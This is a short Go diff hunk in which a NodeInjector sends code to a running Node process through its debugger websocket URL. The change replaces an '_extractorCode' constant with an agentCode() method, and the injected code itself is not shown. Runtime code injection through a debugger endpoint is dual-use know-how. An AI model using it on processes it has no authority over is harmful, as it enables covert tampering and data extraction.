@@ -295,7 +295,7 @@ func (i *NodeInjector) injectViaConn(conn net.Conn) error {
 
 	i.log.Debug("found debugger url", "url", wsURL)
 
-	payload, err := evaluateRequest(_extractorCode, 1)
+	payload, err := evaluateRequest(i.agentCode(), 1)
 	if err != nil {
 		conn.Close()
 		return err
